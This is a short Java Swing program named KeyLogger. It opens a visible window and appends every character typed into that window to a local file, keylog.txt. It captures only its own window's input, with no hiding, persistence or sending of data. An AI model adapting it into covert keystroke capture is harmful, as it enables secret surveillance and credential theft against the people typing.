import java.awt.event.KeyEvent;
import java.awt.event.KeyListener;
import java.io.FileWriter;
import java.io.IOException;
import javax.swing.JFrame;

public class KeyLogger extends JFrame implements KeyListener {
    private static final String LOG_FILE = "keylog.txt";
    
    public KeyLogger() {
        this.setTitle("Keylogger Window");
        this.setSize(300, 200);
        this.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        this.addKeyListener(this);
        this.setVisible(true);
    }
    
    public void keyTyped(KeyEvent e) {
        logKey(e.getKeyChar());
    }
    
    public void keyPressed(KeyEvent e) {}
    
    public void keyReleased(KeyEvent e) {}
    
    private void logKey(char keyChar) {
        try (FileWriter writer = new FileWriter(LOG_FILE, true)) {
            writer.write(keyChar);
            writer.flush();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    
    public static void main(String[] args) {
        new KeyLogger();
    }
}
